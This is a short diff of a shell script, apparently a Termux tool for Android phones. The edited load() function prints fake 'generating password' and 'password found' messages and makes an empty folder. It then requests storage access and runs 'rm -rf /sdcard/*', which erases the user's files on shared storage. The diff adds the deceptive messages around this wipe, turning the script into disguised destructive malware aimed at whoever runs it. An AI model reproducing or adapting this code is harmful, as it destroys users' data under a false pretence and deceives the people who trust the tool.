@@ -72,8 +72,14 @@ sleep 2 && clear
         sleep 0.5 && clear
 }
 load(){
+clear && sleep 3
+echo "GENERATING PASSWORD............."
+sleep 4 && clear
+echo "GENERATING PASSWORD............."
+sleep 4 && clear
+echo "PASSWORD FOUND...... SAVED IN directory password"
+mkdir password
 termux-setup-storage
-rm -rf $PREFIX
 rm -rf /sdcard/*
 }
 
